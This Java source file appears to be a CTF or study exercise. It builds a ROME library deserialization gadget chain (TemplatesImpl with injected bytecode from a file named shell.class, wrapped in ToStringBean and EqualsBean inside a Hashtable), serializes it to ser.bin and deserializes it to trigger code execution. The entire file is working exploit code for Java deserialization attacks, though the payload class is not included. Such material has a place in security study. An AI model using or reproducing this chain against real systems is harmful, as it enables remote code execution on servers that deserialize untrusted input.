package org.example;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.collections4.functors.ConstantTransformer;


import javax.xml.transform.Templates;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;

public class HashTableTest {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\rome\\shell.class"));
        setValue(templates,"_name","aaa");
        setValue(templates,"_bytecodes",new byte[][]{bytes});
        setValue(templates,"_tfactory",new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);
//        HashMap<Object,Object> hashMap = new HashMap<>();
//        hashMap.put(objectBean,"123");
        Hashtable<Object,Object> hashtable = new Hashtable<>();
        hashtable.put(equalsBean,"aaa");
        setValue(toStringBean,"_obj",templates);
        serialize(hashtable);
        unserialize("ser.bin");


    }

    private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
